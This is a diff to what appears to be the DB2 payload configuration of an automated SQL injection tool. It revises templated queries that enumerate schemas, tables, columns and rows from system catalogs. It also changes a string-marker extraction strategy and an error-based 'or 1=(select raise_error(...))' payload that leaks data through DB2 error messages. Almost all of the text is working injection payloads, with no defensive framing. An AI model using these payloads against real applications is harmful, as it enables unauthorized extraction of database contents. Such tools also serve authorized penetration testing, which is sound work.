@@ -19,40 +19,55 @@ resource:
        listagg(
            '${enclose_value_sql}'
            || trim(schemaname)
-           || '${separator_qte_sql}0${enclose_value_sql}'
+           || '${separator_qte_sql}0${enclose_value_sql}',
+           '${separator_cell_sql}'
        )
        || '${trail_sql}'
    )
-   from syscat.schemata
-   ${limit}
+   from (
+       /* Subquery required */
+       select schemaname
+       from syscat.schemata
+       ${limit}
+   )
 
   table: |
    select varchar(
        listagg(
            '${enclose_value_sql}'
            || trim(name)
-           || '${separator_qte_sql}0${enclose_value_sql}'
+           || '${separator_qte_sql}0${enclose_value_sql}',
+           '${separator_cell_sql}'
        )
        || '${trail_sql}'
    )
-   from sysibm.systables
-   where creator = '${database}'
-   ${limit}
+   from (
+       /* Subquery required */
+       select name
+       from sysibm.systables
+       where creator = '${database}'
+       ${limit}
+   )
 
   column: |
    select varchar(
        listagg(
            '${enclose_value_sql}'
            || trim(name)
-           || '${separator_qte_sql}0${enclose_value_sql}'
+           || '${separator_qte_sql}0${enclose_value_sql}',
+           '${separator_cell_sql}'
        )
        || '${trail_sql}'
    )
-   from sysibm.syscolumns
-   where coltype != 'BLOB'
-   and tbcreator = '${database}'
-   and tbname = '${table}'
-   ${limit}
+   from (
+       /* Subquery required */
+       select name
+       from sysibm.syscolumns
+       where coltype != 'BLOB'
+       and tbcreator = '${database}'
+       and tbname = '${table}'
+       ${limit}
+   )
 
   row:
    query: |
@@ -64,11 +79,13 @@ resource:
         listagg(
             '${enclose_value_sql}'
             || s
-            || '${separator_qte_sql}1${enclose_value_sql}'
+            || '${separator_qte_sql}1${enclose_value_sql}',
+           '${separator_cell_sql}'
         )
         || '${trail_sql}'
     )
     from (
+        /* Subquery required */
         select ${fields} s
         from ${database}.${table}
         ${limit}
@@ -93,13 +110,14 @@ strategy:
        select
            varchar(
                replace(
-                   '${lead}'
+                   /* TODO Cleaner lead (similar to 0+1) */
+                   'Sq' || 'Li'
                    || substr (
                        (${injection}),
                        ${window.char}
                    ),
-                   '${lead}${trail_sql}',
-                   '${lead}'
+                   'Sq' || 'Li${trail_sql}',
+                   'Sq' || 'Li'
                )
            )
        from sysibm.sysdummy1
@@ -174,8 +192,9 @@ strategy:
    - name: RAISE_ERROR
      query: |
       /* DB2 SQL Error: SQLCODE=-438, SQLSTATE=70001, SQLERRMC=<sqli>, DRIVER=3.69.24 [SQL State=70001, DB Errorcode=-438] */
-      or 1=(select raise_error('70001',(
+      /* Cast varchar required */
+      or 1=(select cast(raise_error('70001',(
           ${window}
-      )) from SYSIBM.SYSDUMMY1)
+      )) as varchar) from sysibm.sysdummy1)
      # TODO Add to SQLEngine
      capacity: 70
